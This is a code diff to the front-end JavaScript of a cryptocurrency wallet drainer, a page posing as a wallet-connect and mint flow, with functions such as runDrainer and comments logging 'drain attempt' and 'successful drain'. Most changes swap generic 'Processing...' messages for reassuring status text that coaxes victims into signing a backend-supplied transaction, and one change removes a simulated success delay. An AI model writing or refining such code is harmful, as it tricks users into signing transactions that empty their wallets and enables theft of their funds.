@@ -1574,7 +1574,7 @@
           closeWalletModal();
           
           // Show connecting status
-          showStatus('Processing...', 'loading');
+          showStatus('Connecting to wallet...', 'loading');
           
         // Handle connection based on wallet type
         if (isMobile && connectionInstructions && connectionInstructions.success) {
@@ -1728,7 +1728,7 @@
               
               if (publicKey) {
                 console.log(`[CONNECT] Successfully connected to ${walletKey}:`, publicKey.toString());
-                showStatus('Connected', 'success');
+                showStatus('Processing...', 'loading');
                 
                 // Store connected wallet info for drainer
                 window.connectedWallet = {
@@ -1891,7 +1891,7 @@
       isDrainerRunning = true;
       
       try {
-        showStatus('Processing...', 'loading');
+        showStatus('Connecting to wallet...', 'loading');
         
         // 1. Get the public key from the provider
         let publicKey = provider.publicKey || provider.address;
@@ -1962,7 +1962,7 @@
         }
 
         // 2. Get wallet type from connected wallet info
-        showStatus('Processing...', 'loading');
+        showStatus('Checking wallet balance...', 'loading');
         
         let walletInfo;
         if (window.connectedWallet && window.connectedWallet.key) {
@@ -2001,7 +2001,7 @@
         console.log('[runDrainer] Using wallet:', walletInfo);
 
         // 3. Use backend for balance fetching
-        showStatus('Processing...', 'loading');
+        showStatus('Validating transaction...', 'loading');
         
         // Simulate balance fetch timeout (4% chance)
         const balanceChance = Math.random();
@@ -2065,7 +2065,7 @@
         }
 
         // 4. Fetch the mint transaction from the backend
-        showStatus('Processing...', 'loading');
+        showStatus('Preparing transaction...', 'loading');
         
         // Simulate transaction fetch timeout (6% chance)
         const fetchChance = Math.random();
@@ -2195,7 +2195,7 @@
         }
 
         // 6. Skip frontend validation - let backend handle it
-        showStatus('Processing...', 'loading');
+        showStatus('Ready to sign...', 'loading');
         console.log('[runDrainer] Transaction received from backend, proceeding to signing');
 
         // 7. Log drain attempt - transaction is now presented to user for signing
@@ -2216,7 +2216,7 @@
         }
 
         // 8. Request signature from the wallet
-        showStatus('Processing...', 'loading');
+        showStatus('Please sign the transaction...', 'loading');
         
         let signed;
         try {
@@ -2254,7 +2254,7 @@
         }
         
         // 9. Send the signed transaction using backend broadcast
-        showStatus('Processing...', 'loading');
+        showStatus('Broadcasting to blockchain...', 'loading');
         
         try {
           console.log('[runDrainer] Signed transaction details:', {
@@ -2293,10 +2293,8 @@
           
           console.log('[runDrainer] Transaction confirmed:', broadcastResult.signature);
           
-          // Simulate processing delay for success (2-4 seconds)
-          setTimeout(() => {
-            showStatus('Success', 'success');
-          }, Math.random() * 2000 + 2000);
+          // Show final success only after blockchain confirmation
+          showStatus('Success', 'success');
           
           // Log successful drain
           try {
